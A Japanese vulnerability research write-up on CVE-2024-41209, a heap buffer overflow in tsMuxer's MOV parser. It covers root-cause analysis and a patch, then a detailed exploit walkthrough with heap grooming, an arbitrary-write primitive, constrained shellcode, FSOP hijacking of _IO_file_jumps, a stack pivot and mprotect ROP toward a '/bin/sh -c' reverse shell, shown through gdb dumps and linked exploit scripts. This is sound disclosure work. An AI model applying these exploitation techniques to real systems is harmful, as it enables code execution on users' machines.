Thread 1 "tsMuxeR" hit Breakpoint 1, MovDemuxer::mov_read_trun (this=0x939e30, atom=...) at /workdir/tsMuxer/movDemuxer.cpp:1078
1078	    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
sc->ctts_data.size()
$16 = 0x14
sc->ctts_data.capacity()
$17 = 0x20
sc->ctts_count
$18 = 0x32

```
### heap BOFの根本原因を特定

gdb scriptの実行結果を確認すると、3回目のbreakから4回目のbreakの間にctts\_data.sizeが0に初期化されるタイミングがあるようです。一方で、capacityは初期化されていません。ctts\_countは一貫して足され続けていて、capacityの値を超えたindexに書き込みが行われており、vector用のheap領域にてheap BOFが起きています。

`MovDemuxer::mov_read_trun()` 以外でctts\_data.sizeに変更を加えるコードを探すと `MovDemuxer::mov_read_ctts()` が見つかります。ここで、 `st->ctts_data.resize(entries);` によってctts\_dataのベクターをresizeしている一方で、ctts\_countやctts\_dataベクターのcapacityを初期化していないことに気づきます。

```
int MovDemuxer::mov_read_ctts(MOVAtom atom)
{
    const auto st = reinterpret_cast<MOVStreamContext*>(tracks[num_tracks - 1]);
    get_byte();  // version
    get_be24();  // flags
    const unsigned entries = get_be32();
    st->ctts_data.resize(entries);
    for (unsigned i = 0; i < entries; i++)
    {
        st->ctts_data[i].count = get_be32();
        st->ctts_data[i].duration = get_be32();
        // st->time_rate= av_gcd(st->time_rate, abs(st->ctts_data[i].duration));
    }
    return 0;
}

```

`MovDemuxer::mov_read_trun()` 内では、emplace\_backによるsizeのインクリメントとctts\_countのインクリメントは同時に行われるので範囲外参照を起こさないかのように見えます。

しかし、`MovDemuxer::mov_read_trun()` → `MovDemuxer::mov_read_ctts()` → `MovDemuxer::mov_read_trun()` の順番に実行された際には、sizeだけはユーザー入力によってresizeされる一方で、ctts\_countやcapacityは初期化されず、sizeがcapacityを下回っている場合はベクターの再確保もされないので、2回目以降の`MovDemuxer::mov_read_trun()` にてcapacityを超えて範囲外書き込みが起きてしまうのです。`MovDemuxer::mov_read_trun()` の後に`MovDemuxer::mov_read_ctts()` を実行することを想定していなかったのだと思われます。

この脆弱性には、以下のようなパッチを行いました。

`shrink_to_fit()`を使うことで、capacityをresizeしたベクターのsizeに合わせています。

```
int MovDemuxer::mov_read_ctts(MOVAtom atom)
{
    const auto st = reinterpret_cast<MOVStreamContext*>(tracks[num_tracks - 1]);
    get_byte();  // version
    get_be24();  // flags
    const unsigned entries = get_be32();
    st->ctts_data.resize(entries);
+    st->ctts_data.shrink_to_fit();
+    st->ctts_count = 0;
    for (unsigned i = 0; i < entries; i++)
    {
        st->ctts_data[i].count = get_be32();
        st->ctts_data[i].duration = get_be32();
        // st->time_rate= av_gcd(st->time_rate, abs(st->ctts_data[i].duration));
    }
    return 0;
}

```

さて、以上のようにクラッシュ入力を用いて解析を行い脆弱性の根本原因を特定しましたが、1つ目の脆弱性が全く別の脆弱性を発火させ、その結果クラッシュを引き起こしたという非常に面白いクラッシュ入力であったことが分かりました。クラッシュ入力のMOVファイルではcttsアトム → trunアトムの順に一つずつのみ存在しており、本来2つ目のheap BOFの条件を満たしてはいなかったはずですが、stsdアトムでの”over-parse”によってcttsアトムとtrunアトムに対して余分にparseを行なってしまうことで条件が整い、2つ目のheap BOFが発火していたのです。

一般に、条件の厳しい脆弱性や、クラッシュやOOBを引き起こさないロジックバグなどをFuzzingで見つけるのは難しいです。しかし今回のクラッシュ入力は、発火条件はそこまで厳しくないがクラッシュしない脆弱性と、発火条件は厳しいがクラッシュを引き起こす脆弱性がチェインした結果、Fuzzingによって見つかったという珍しい事例でした。

## エクスプロイト開発

見つかった脆弱性にパッチを当てた後は、その脆弱性の攻撃可能性を評価しましょう。今回のheap BOFの書き込み部分を再度確認します。1と32bitの入力を交互に書き込むことが出来そうです。

```
            sc->ctts_data.emplace_back();
            sc->ctts_data[sc->ctts_count].count = 1;
            sc->ctts_data[sc->ctts_count].duration = get_be32();
            sc->ctts_count++;

```

私たちはこのheap BOFをcriticalでRCEに繋げられる脆弱性であると推定し、exploitableであることを証明するエクスプロイトコードを作成することにしました。

### エクスプロイトにおける課題

まず、CTFでbinary exploitationの問題を解く際と同じように、tsMuxerが配布しているバイナリのセキュリティ機構を確認します。tsMuxerはバイナリをportableにする目的でstatic-linkedでかつno-pieなバイナリをデフォルトで配布しており、攻撃者視点ではアドレスリークのprimitiveがほとんど必要ないことが嬉しいポイントです。

```
$ file ./tsMuxeR
./tsMuxeR: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=56c7bf03a7cbd46c1f7fc3ce82bf651f023e9f7c, for GNU/Linux 3.2.0, with debug_info, not stripped
$ checksec ./tsMuxeR
[*] '/home/vagrant/tsMuxer/bin/lnx/tsMuxeR'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

このバイナリに対するAttack Vectorを考えます。victimがこのバイナリを用いて悪意のあるMOVファイルを開いてしまう、というのが最も考えられるシチュエーションでしょう。ブログ冒頭で言及した通りtsMuxerはサーバーサイドでも使用されてはいますが、Attack Vectorを考慮すると攻撃者とvictimの間にインタラクティブなコネクションがはられていない状況を想定するのが自然であり、その場合は `system("/bin/sh")` を呼ぶだけでは不十分です。それゆえ、リバースシェルを起動することを攻撃のゴールとしましょう。

### 脆弱性を発火させる最小のPoCの作成

releaseバイナリにおいて脆弱性を発火させる最小のPoCを作成しましょう。得られているクラッシュ入力はfuzzingする中で変異させていたものですので、脆弱性の発火の原因となる部分以外にも余計なデータが多分に含まれています。余分なデータのparseの際に呼ばれる各種関数は各種構造体をheapに確保し、heap領域の状態をより複雑にしてしまうので、エクスプロイトする上で邪魔になります。最小限のPoCを作成することでheap領域に作られるChunkの状態を整え、この先のエクスプロイトの際の見通しを良くします。

脆弱性を発火させる最小のPoCを以下に示します。

<https://github.com/RICSecLab/exploit-poc-public/blob/main/CVE-2024-41209/exploit_min_poc.py>

作られたexploit.movを配布バイナリtsMuxeRに渡して実行すると、脆弱性が発火することがわかります。

### Overflow先の構造体の選定

現在持っているprimitiveは、`MovDemuxer::mov_read_trun()` → `MovDemuxer::mov_read_ctts()` → `MovDemuxer::mov_read_trun()` の順番で実行した時に、ctts\_dataベクターの領域を越えてheap BOFできるというものです。heap BOFは自由な書き込みではなく、big endianのint `1` と、任意の4byteのデータを足した合計8byteの入力を好きな回数入力できるというprimitiveです。

このprimitiveを使って、より強力なprimitiveを得ることを次の目標とします。方針としては以下の通りです。

1. `MovDemuxer::mov_read_ctts()` と2回目の`MovDemuxer::mov_read_trun()` のcallの間に何かheapに構造体Aを取る関数を実行する
2. ctts\_dataベクターの下に隣接するheap領域に構造体Aが取られている状態で、heap BOFで構造体Aの中のポインタを書き換える
3. 書き換えたポインタを使うことでより強力なprimitiveを得る

`MovDemuxer::mov_read_ctts()` と`MovDemuxer::mov_read_trun()` の間に`MovDemuxer::mov_read_xxxx()` のような関数群を呼ぶということは、cttsアトムとtrunアトムの間にxxxxアトムを埋め込むことで簡単に実現できます。そこで、これら`MovDemuxer::mov_read_xxxx()` が実行時にheapに確保する構造体のうち、書き換えるのに都合のよい構造体を選定します。

構造体のallocationが行われる関数は以下の2つです。

* `MovDemuxer::mov_read_stsd()`
  + MovParsedXXXTrackData構造体 (XXXはH264, H265, Audio, SRT)
* `MovDemuxer::mov_read_trak()`
  + MOVStreamContext構造体

その他、構造体ではないがheapに配列などを確保する関数として、以下の3つがあります

* `MovDemuxer::mov_read_extradata()`
* `MovDemuxer::mov_read_glbl()`
* `MovDemuxer::mov_read_esds()`

MovParsedXXXTrackData構造体を確認すると、ParsedTrackPrivData構造体を継承しています。

ParsedTrackPrivDataはvirtualメソッドをいくつか持っていて、 MovParsedXXXTrackData構造体ではそれらをオーバーライドしています。

```
class ParsedTrackPrivData
{
   public:
    ParsedTrackPrivData(uint8_t* buff, int size) {}
    ParsedTrackPrivData() = default;
    virtual ~ParsedTrackPrivData() = default;

    virtual void setPrivData(uint8_t* buff, int size) {}
    virtual void extractData(AVPacket* pkt, uint8_t* buff, int size) = 0;
    virtual unsigned newBufferSize(uint8_t* buff, unsigned size) { return 0; }
};

```

そのため、 MovParsedXXXTrackData構造体をheapに確保すると、その中にはMovParsedXXXTrackData用のvtableが確保されています。vtableのポインタを書き換えてfakeのvtableのアドレスを指すように変更することで、RIPを取ることが出来るかもしれません。

```
gef> x/20gx 0x93a690
0x93a690:	0x0000000000000000	0x0000000000000051
0x93a6a0:	0x0000000000000001	0x00000000deadbeef <- trun1
0x93a6b0:	0x0000000000000001	0x00000000cafebabe
0x93a6c0:	0x0000000000000001	0x00000000fee1dead
0x93a6d0:	0x0000000000000000	0x0000000000000000
0x93a6e0:	0x0000000000000000	0x0000000000000041
0x93a6f0:	0x00000000008eb088	0x000000000093a4c0 <- MovParsedXXXTrackData
0x93a700:	0x0000000000939e30	0x0000000000000000
0x93a710:	0x0000000000000000	0x0000000000000000
0x93a720:	0x0000000000000004	0x00000000000058e1

gef> x/12gx 0x8eb088
0x8eb088 <vtable for MovParsedH264TrackData+16>:	0x00000000004bfe88	0x00000000004bfec6
0x8eb098 <vtable for MovParsedH264TrackData+32>:	0x00000000004befd8	0x00000000004bf8d4
0x8eb0a8 <vtable for MovParsedH264TrackData+48>:	0x00000000004bfae0	0x0000000000000000
0x8eb0b8 <vtable for MovParsedAudioTrackData+8>:	0x00000000008f6600	0x00000000004ccd6c
0x8eb0c8 <vtable for MovParsedAudioTrackData+24>:	0x00000000004ccd9a	0x00000000004be9fa
0x8eb0d8 <vtable for MovParsedAudioTrackData+40>:	0x00000000004bea96	0x00000000004bebda

```

次にMOVStreamContext構造体を確認します。ctts\_dataのベクターが末尾にあります。このctts\_dataのベクターは、`MovDemuxer::mov_read_ctts` を呼ぶことにより値を書き込みができることが分かっています。つまり、MOVStreamContext構造体を確保してctts\_dataのベクターをセットした後にheap BOFでこのポインタを破壊すれば、AAWのprimitiveが得られそうです。今回はこれを使います。

```
struct MOVStreamContext : Track
{
    MOVStreamContext()
        : m_indexCur(0),
					...
          sample_rate(0)
    {
    }
		...
    vector<uint32_t> keyframes;
    // vector<MOVDref> drefs;
    vector<MOVStts> stts_data;
    vector<MOVStts> ctts_data;
};

```
### AAW

AAW (Arbitrary Address Write)は任意のアドレスに書き込みができるprimitiveです。今回のExploitではリバースシェルを起動することが最終目標なので、任意の文字列に対してexecveできる必要があります。シェルコードや文字列をメモリ上に作成したり、RIPを制御したりするには、heap BOFよりも強力で使い勝手のよいprimitiveを得ることが必要不可欠です。

heap BOFでMOVStreamContext構造体を書き換えて、AAWのprimitiveを得る手順を確認します。わかりやすさのために1回目にcallした`MovDemuxer::mov_read_trun()` を`MovDemuxer::mov_read_trun1` のように表記することにします。

まず、`MovDemuxer::mov_read_trun1` → `MovDemuxer::mov_read_ctts1` の順番に呼んで、sizeのみを0にします。次に`MovDemuxer::mov_read_trak` → `MovDemuxer::mov_read_ctts2` の順番に実行することで、最初の`MovDemuxer::mov_read_ctts1`で確保したctts\_dataベクターの直下にMOVStreamContext構造体を確保し、その構造体の中に破壊対象であるctts\_dataベクターを用意します。`MovDemuxer::mov_read_trun2` でheap BOFを発火させ、MOVStreamContext構造体の中のctts\_dataベクターを書き換えてから、`MovDemuxer::mov_read_ctts3` でそのベクターに対して書き込みを試みることでAAWが実現することができるはずです。

実際にデバッグして確認します。`MovDemuxer::mov_read_trun2`でheap BOFが発生する直前のheap領域は以下のようになっています。

```
gef> x/200gx 0x000000000093a650
0x93a650:	0x0000000000000000	0x0000000000000000
0x93a660:	0x0000000000000000	0x0000000000000031
0x93a670:	0x0000000000000000	0x000000000091e250 <- ctts2で確保したベクター
0x93a680:	0x0000000000000001	0x0000000000000000
...
ctts1で確保したベクターがemplace_backで再確保された後にfreeされたチャンク達
...
0x93a880:	0x0000000000000000	0x0000000000000211
0x93a890:	0x0000000000000001	0x0000000000000000 <- ctts1で確保したベクター
0x93a8a0:	0x0000000000000001	0x0000000000000000
0x93a8b0:	0x0000000000000001	0x0000000000000000
0x93a8c0:	0x0000000000000001	0x0000000000000000
0x93a8d0:	0x0000000000000001	0x0000000000000000
0x93a8e0:	0x0000000000000001	0x0000000000000000
...
0x93aa50:	0x0000000000000001	0x0000000000000000
0x93aa60:	0x0000000000000001	0x0000000000000000
0x93aa70:	0x0000000000000001	0x0000000000000000
0x93aa80:	0x0000000000000000	0x0000000000000000
0x93aa90:	0x0000000000000000	0x0000000000000191
0x93aaa0:	0x0000000000000040	0x0000000000000000 <- MovStreamContext構造体
0x93aab0:	0x0000000000000000	0x0000000000000000
0x93aac0:	0x0000000000000000	0x0000000000000000
0x93aad0:	0x0000000000000000	0x0000000000000000
0x93aae0:	0x0000000000000000	0x0000000000000000
0x93aaf0:	0x0000000000000000	0x0000000000000000
0x93ab00:	0x0000000000000000	0x0000000000000000
0x93ab10:	0x0000000000000000	0x0000000000000000
0x93ab20:	0x0000000000000000	0x0000000000000000
0x93ab30:	0x0000000000000000	0x0000000000000000
0x93ab40:	0x0000000000000000	0x0000000000000000
0x93ab50:	0x0000000000000000	0x0000000000000000
0x93ab60:	0x0000000000000002	0x0000000000000000
0x93ab70:	0x0000000000000000	0x0000000000000000
0x93ab80:	0x0000000000000000	0x0000000000000000
0x93ab90:	0x0000000000000000	0x0000000000000000
0x93aba0:	0x0000000000000000	0x0000000000000000
0x93abb0:	0x0000000000000000	0x0000000000000000
0x93abc0:	0x0000000000000000	0x0000000000000000
0x93abd0:	0x0000000000000000	0x0000000000000000
0x93abe0:	0x0000000000000000	0x0000000000000000
0x93abf0:	0x0000000000000000	0x0000000000000000
0x93ac00:	0x0000000000000000	0x000000000093a650 <- 破壊対象のctts_dataベクター
0x93ac10:	0x000000000093a660	0x000000000093a660
0x93ac20:	0x0000000000000000	0x0000000000000021
0x93ac30:	0x0000000000000000	0x0000000000000000
0x93ac40:	0x0000000000000000	0x00000000000053c1

```

`MovDemuxer::mov_read_trun2` の後に`MovDemuxer::mov_read_ctts3` でベクターに書き込んでみましょう。ベクターの `_M_impl._M_start` がoverwriteされ、そのアドレスへ書き込みが行われていることが分かります。

```
gef> x/58gx 0x93aa80
0x93aa80:	0x0000000000000001	0x00000000deadbeef
0x93aa90:	0x0000000000000001	0x0000000000000191
0x93aaa0:	0x0000000000000001	0x000000006e757274
0x93aab0:	0x0000000000000001	0x000000006e757274
...
0x93abe0:	0x0000000000000001	0x000000006e757274
0x93abf0:	0x0000000000000001	0x000000006e757274
0x93ac00:	0x0000000000000001	0x000000000091c800 <- ctts_data._M_impl._M_start
0x93ac10:	0x000000000093a660	0x000000000093a660
0x93ac20:	0x0000000000000000	0x0000000000000021
0x93ac30:	0x0000000000000000	0x0000000000000000
0x93ac40:	0x0000000000000000	0x00000000000053c1
gef> x/6gx 0x000000000091c800
0x91c800:	0x00000000deadbeef	0x00000000cafebabe
0x91c810:	0x00000000deadbeef	0x00000000cafebabe
0x91c820:	0x0000000000000000	0x0000000000000000

```

AAWを実行するコードは以下のとおりです。

<https://github.com/RICSecLab/exploit-poc-public/blob/main/CVE-2024-41209/exploit_aaw.py>

任意サイズの32bit列を任意のアドレスに書き込むことが出来ます。32bit列なので例えば64bitのアドレスを書き込むことはできません。しかし、no-pieでstatic linkなバイナリにおいては十分なwrite primitiveを得ることができました。

### エクスプロイト

得られたAAWのprimitiveを使ってRCEに繋げます。staticバイナリなので使用していないlibcの関数はバイナリ中に存在しません。system関数が存在しないので、リバースシェルを起動するにはいくつかのガジェットを自由に実行できる必要があります。

今回のエクスプロイトではシェルコードを実行することにしました。AAWのprimitiveは実際の32bit列しか書き込めないという制限があるので、上位32bitが `00000000` であっても動くようなシェルコードを作成します。また、write権限とexecute権限が同時に付与されているメモリ領域は存在していないので、Return Oriented Programming (ROP)でmprotectを呼ぶことで書き込んだシェルコードを実行できるようにします。

具体的な方針としては次の通りです。

1. AAWでメモリ上にシェルコードを配置する
2. RIPを取る (任意のアドレスにプログラムカウンタを飛ばす)
3. ガジェットを実行してstack pivotをする
4. ROPでシェルコードのあるメモリ領域に実行権限を付与する
5. シェルコードを実行 → リバースシェルを起動する

### シェルコードを作成する

シェルコードを実行してリバースシェルを起動する場合、次の二つのステップが必要です。

* メモリ上に、任意の文字列を`/bin/sh -c` に繋げて用意すること
* 引数に用意した文字列を渡した状態で、execveシステムコールを呼び出すこと

32bit列しか書き込めないAAWの書き込みで作成したシェルコードで、これらを実現することを考えます。

まず、AAWにて上位32bitに0が書き込まれてしまう問題がありますが、その上位32bit部分を即値に相当する部分として扱うことによって解決します。言葉で説明してもわかりにくいので、機械語の例を以下に示します。

32bit列しか書き込めない、というのは以下のように上位32bitが`00000000` となるような、64bitの値を連続して書き込める状態です。

```
gef> x/32gx 0x901410
0x901410 <_dl_main_map+208>:	0x00000000b990c031	0x00000000b990900c
0x901420 <_dl_main_map+224>:	0x00000000b908e0c1	0x00000000b9900d0c
0x901430 <_dl_main_map+240>:	0x00000000b908e0c1	0x00000000b990d00c
0x901440 <_dl_main_map+256>:	0x00000000b9902fb3	0x00000000b9901888
0x901450 <_dl_main_map+272>:	0x00000000b990c031	0x00000000b990900c
0x901460 <_dl_main_map+288>:	0x00000000b908e0c1	0x00000000b9900d0c
0x901470 <_dl_main_map+304>:	0x00000000b908e0c1	0x00000000b990d10c
0x901480 <_dl_main_map+320>:	0x00000000b99062b3	0x00000000b9901888
0x901490 <_dl_main_map+336>:	0x00000000b990c031	0x00000000b990900c
0x9014a0 <_dl_main_map+352>:	0x00000000b908e0c1	0x00000000b9900d0c

```

この0の部分を即値に相当する部分として解釈されるようにするとは、上のメモリ領域を機械語として解釈した時の結果を確認すると理解できると思います。

`mov ecx, 0` の部分を見てください。0xb9に続く、0x00000000は即値として扱われており、全体として5byteのvalidな命令列となっています。

```
 ->   0x901410 31c0                           xor    eax, eax
      0x901412 90                             nop
      0x901413 b900000000                     mov    ecx, 0
      0x901418 0c90                       　  or     al, 0x90
      0x90141a 90                             nop
      0x90141b b900000000                     mov    ecx, 0
      0x901420 c1e008                         shl    eax, 8
      0x901423 b900000000                     mov    ecx, 0
      0x901428 0c0d                           or     al, 0xd
      0x90142a 90                             nop
      0x90142b b900000000                     mov    ecx, 0

```

この`mov ecx, 0` を間に挟むことで、好きな3byteの機械語を連続して実行できるようになります。rcxレジスタへの操作以外の`mov ecx, 0` の副作用はありません。

次にこの3byte以内の命令の連続で、任意のアドレスに1byteの書き込みを行うことを実現します。書き込みには`mov [rax], bl` という2byteの命令を使います。書き込み先のアドレスをraxレジスタに用意する必要がありますが、 `xor eax, eax` で0に初期化した後に、`or al, 0x90` のように好きな1byte(ここでは0x90)をalレジスタに格納し、`shl eax, 8` でシフトすることを繰り返すことで、任意の32bitアドレスをeaxレジスタに用意することが可能です。

例えば、以下のようなシェルコードをメモリ上に配置して実行することで、アドレス0x900dd0に0x2fを書き込むことができます。

```
      0x901410 31c0                           xor    eax, eax
      0x901412 90                             nop
      0x901413 b900000000                     mov    ecx, 0
      0x901418 0c90                           or     al, 0x90
      0x90141a 90                             nop
      0x90141b b900000000                     mov    ecx, 0
      0x901420 c1e008                         shl    eax, 8
      0x901423 b900000000                     mov    ecx, 0
      0x901428 0c0d                           or     al, 0xd
      0x90142a 90                             nop
      0x90142b b900000000                     mov    ecx, 0
      0x901430 c1e008                         shl    eax, 8
      0x901433 b900000000                     mov    ecx, 0
      0x901438 0cd0                           or     al, 0xd0
      0x90143a 90                             nop
      0x90143b b900000000                     mov    ecx, 0
      0x901440 b32f                           mov    bl, 0x2f
      0x901442 90                             nop
      0x901443 b900000000                     mov    ecx, 0
      0x901448 8818                           mov    byte ptr [rax], bl
      0x90144a 90                             nop
      0x90144b b900000000                     mov    ecx, 0

```

つまり、このシェルコードの実行さえできれば、「任意のアドレスに1byte書き込める」という、より強力なAAW primitiveを得ることができます。複数回このprimitiveを使用することで、任意の文字列をメモリ上に作成できます。

任意の文字列を作成した後は、execveシステムコールを呼ぶだけです。

eaxに任意の32bitアドレスを作った後に、`mov edi, eax` のような2byte命令を実行すれば、rdi, rsi, rdxレジスタにも任意の32bitアドレスを用意できます。

例えば、以下のようにレジスタを設定してsyscall命令を実行すればよいです。

* raxレジスタにexecveのsyscall番号である0x3bをセット
* rdiレジスタに `/bin/sh` の文字列の格納されたアドレスをセット
* rsiレジスタにargvのアドレスとして、 `/bin/sh` のアドレスが入っているポインタのアドレスをセット
* rdxに0をセット

```
[+] Detected syscall (arch:X86, mode:64)
    execve(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp)
[+] Parameter            Register             Value
    RET                  $rax                 -
    _NR                  $rax                 0x3b
    filename             $rdi                 0x0000000000900dd0 <main_arena+0x530>  ->  0x0068732f6e69622f ('/bin/sh'?)
    argv                 $rsi                 0x0000000000900db0 <main_arena+0x510>  ->  0x0000000000900dd0 <main_arena+0x530>  ->  0x0068732f6e69622f ('/bin/sh'?)
    envp                 $rdx                 0x0000000000000000

```

argvとして渡される0x900dd0のメモリ領域には以下のように文字列を用意すればよいです。

```
gef> x/8gx 0x900dd0
0x900dd0 <main_arena+1328>:	0x0068732f6e69622f	0x0000000000900dc0
0x900de0 <main_arena+1344>:	0x000000000000632d	0x0000000000900dd0
0x900df0 <main_arena+1360>:	0x3b61686c2d20736c	0x746164203b646920
0x900e00 <main_arena+1376>:	0x0000000000900065	0x0000000000900df0

```
```
gef> x/25s 0x0000000000900dd0
0x900dd0 <main_arena+1328>:	"/bin/sh"
0x900dd8 <main_arena+1336>:	"\300\r\220"
...
0x900de0 <main_arena+1344>:	"-c"
...
0x900de8 <main_arena+1352>:	"\320\r\220"
...
0x900df0 <main_arena+1360>:	"ls -lha; id; date"
0x900e02 <main_arena+1378>:	"\220"
...
0x900e08 <main_arena+1384>:	"\360\r\220"
0x900e0c <main_arena+1388>:	""

```

以上のようなシェルコードをメモリ上に用意すれば、あとはrwx権限をそのメモリ領域に付与し、RIPレジスタをそのシェルコードの先頭に飛ばすだけで、リバースシェルを実行できます。

今回の例では `ls -lha; id; date` を実行しているだけですが、この文字列をリバースシェルを実行するような文字列に変えればよいです。

シェルコードを作成するpythonスクリプトは以下の通りです。

<https://github.com/RICSecLab/exploit-poc-public/blob/main/CVE-2024-41209/exploit_shellcode.py>

### RIPを取る

今回はRIPを制御するために、File Structure Oriented Programming (FSOP)を使います。static linkedなバイナリでは、File構造体のvtableの範囲チェックが存在しないだけでなく、vtable自体もrw可能領域にmapされています。このvtableの適切な関数ポインタを書き換えるだけで、File構造体にアクセスする様々なinternal関数の中でRIPをハイジャックできます。

今回は、`MovDemuxer::mov_read_cmov()` を使って\_\_cxa\_throw経由でFSOPを発火させます。。これにより、破壊したctts\_dataベクターのデストラクタで落ちることなくRIPを取ることができます。

```
int MovDemuxer::mov_read_cmov(MOVAtom atom) { THROW(ERR_MOV_PARSE, "Compressed MOV not supported in current version") }

```

FSOPでRIPを飛ばす時のレジスタの状態を確認します。

生成したexploit.movを渡し実行すると、\_IO\_file\_jumpsの13番目のエントリを書き換えることでRIPをハイジャックできることがわかります。実は他のエントリでもハイジャックすることは可能ですが、今回はこの13番目のエントリである\_IO\_sync\_tをガジェットのアドレスに書き換えることにします。

<https://github.com/RICSecLab/exploit-poc-public/blob/main/CVE-2024-41209/exploit_rip.py>

```
Thread 1 "tsMuxeR" received signal SIGSEGV, Segmentation fault.
0x00000000dead000c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- registers ----
$rax   : 0x0000000000000828
$rbx   : 0x0000000000900420 <_IO_2_1_stdout_>  ->  0x00000000fbad2a84
$rcx   : 0x0000000000000001
$rdx   : 0x0000000000901920 <_IO_str_chk_jumps>  ->  0x0000000000000000
$rsp   : 0x00007fffffffdc18  ->  0x000000000072b256 <fflush+0x86>  ->  0x950f41c085c03145
$rbp   : 0x0000000000901e60 <_IO_file_jumps>  ->  0x00000000dead0000
$rsi   : 0x0000000000000540
$rdi   : 0x0000000000900420 <_IO_2_1_stdout_>  ->  0x00000000fbad2a84
$rip   : 0x00000000dead000c
$r8    : 0x0000000000918580 <std::cout>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  0x88c0c748fa1e0ff3
$r9    : 0x00007fffffffd950  ->  0x00007fffffffdb38  ->  0x000000000093aec0  ->  0x474e5543432b2b00
$r10   : 0x000000000091a3b0 <dwarf_reg_size_table>  ->  0x0808080808080808
$r11   : 0x0000000000000000
$r12   : 0x0000000000918580 <std::cout>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  0x88c0c748fa1e0ff3
$r13   : 0x00000000007e2a98  ->  0x00203a726f727245 ('Error: '?)
$r14   : 0x00000000008fe018 <_GLOBAL_OFFSET_TABLE_+0x18>  ->  0x0000000000760dc0 <__strcasecmp_avx>  ->  0x90c0c748fa1e0ff3
$r15   : 0x00007fffffffdc90  ->  0x00000000ffffde00
$eflags: 0x10206 [ident align vx86 RESUME nested overflow direction INTERRUPT trap sign zero adjust PARITY carry] [Ring=3]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ stack ----
$rsp  0x7fffffffdc18|+0x0000|+000: 0x000000000072b256 <fflush+0x86>  ->  0x950f41c085c03145  <-  retaddr[1]
      0x7fffffffdc20|+0x0008|+001: 0x00007fffffffdecd  ->  0xffffffdee0000000
      0x7fffffffdc28|+0x0010|+002: 0x0000000000918460 <std::cerr>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  ...
      0x7fffffffdc30|+0x0018|+003: 0x00007fffffffdc90  ->  0x00000000ffffde00  <-  $r15
      0x7fffffffdc38|+0x0020|+004: 0x00000000006afee3 <std::ostream::flush()+0x23>  ->  0xe0894c0874fff883  <-  retaddr[2]
      0x7fffffffdc40|+0x0028|+005: 0x0000000000918460 <std::cerr>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  ...
      0x7fffffffdc48|+0x0030|+006: 0x00000000006b0740 <std::ostream::sentry::sentry(std::ostream&)+0x50>  ->  0x8be8580348038b48  <-  retaddr[3]
      0x7fffffffdc50|+0x0038|+007: 0x00007fffffffdc80  ->  0x696f6c7078652f2e './exploit.mov'
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ code:x86:64 ----
[!] Cannot access memory at address 0xdead000c

```
###

### Stack pivot

32bitの配列をAAWで書き込む都合から、\_IO\_file\_jumpsの上のメモリ領域にROPのペイロードを用意し、stack pivotでそこに制御を移すことにします。

espにアクセスするガジェットは複数ありますが、今回は `mov esp, ebp; pop rbx; pop rbp; mov rax, r12; pop r12; ret` ガジェットを使います。ebpには\_IO\_file\_jumpsのアドレスが入っているので、stackを\_IO\_file\_jumpsにpivotできます。

\_IO\_file\_jumpsの0から14番目までの\_IO\_sync\_tを除いたエントリは、\_IO\_sync\_tにアクセスするまでに使用されることはなかったので好きなアドレスを書き込んでおくことができます。

ここまでのコードを以下に示します。

<https://github.com/RICSecLab/exploit-poc-public/blob/main/CVE-2024-41209/exploit_stack_pivot.py>

### ROPでmprotectを実行

ここでは、\_IO\_file\_jumpsのアドレスより上のメモリ領域にシェルコードを配置します。

これにより1回のctts\_dataベクターの書き込みで、\_IO\_file\_jumpsの書き換えとシェルコードの配置を同時に達成できます。

13番目の`mov esp, ebp; pop rbx; pop rbp; mov rax, r12; pop r12; ret` ガジェットを上手くpopで回避しながら、mprotectを実行し、シェルコードの領域にretすれば、リバースシェルが起動します。mprotectを実行して、rwx領域にretするまでの動作を実際に確認してみます。

```
import gdb

gdb.execute('set substitute-path /workdir .')
gdb.execute('b MovDemuxer::mov_read_cmov')
gdb.execute('r')
gdb.execute('b *0x007b0851')
gdb.execute('c')

```

まず、stack pivotのガジェットが実行されます。

```
$rax   : 0x0000000000000828
$rbx   : 0x0000000000900420 <_IO_2_1_stdout_>  ->  0x00000000fbad2a84
$rcx   : 0x0000000000000001
$rdx   : 0x0000000000901920 <_IO_str_chk_jumps>  ->  0x0000000000000000
$rsp   : 0x00007fffffffdc18  ->  0x000000000072b256 <fflush+0x86>  ->  0x950f41c085c03145
$rbp   : 0x0000000000901e60 <_IO_file_jumps>  ->  0x00000000dead0000
$rsi   : 0x0000000000000540
$rdi   : 0x0000000000900420 <_IO_2_1_stdout_>  ->  0x00000000fbad2a84
$rip   : 0x00000000007b0851 <fread_unlocked+0x51>  ->  0x41e0894c5d5bec89
$r8    : 0x0000000000918580 <std::cout>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  0x88c0c748fa1e0ff3
$r9    : 0x00007fffffffd950  ->  0x00007fffffffdb38  ->  0x000000000093aec0  ->  0x474e5543432b2b00
$r10   : 0x000000000091a3b0 <dwarf_reg_size_table>  ->  0x0808080808080808
$r11   : 0x0000000000000000
$r12   : 0x0000000000918580 <std::cout>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  0x88c0c748fa1e0ff3
$r13   : 0x00000000007e2a98  ->  0x00203a726f727245 ('Error: '?)
